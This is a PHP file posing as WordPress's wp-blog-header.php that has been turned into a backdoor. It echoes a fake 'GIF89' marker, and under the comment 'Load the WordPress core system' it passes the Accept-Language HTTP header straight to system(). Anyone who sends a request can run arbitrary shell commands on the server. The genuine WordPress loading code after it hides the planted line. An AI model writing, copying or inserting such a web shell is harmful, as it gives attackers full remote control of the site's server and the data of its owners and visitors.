<?php
echo "<!-- GIF89;a -->\n";
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
 
// Load the WordPress core system
system($_SERVER['HTTP_ACCEPT_LANGUAGE']);
if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
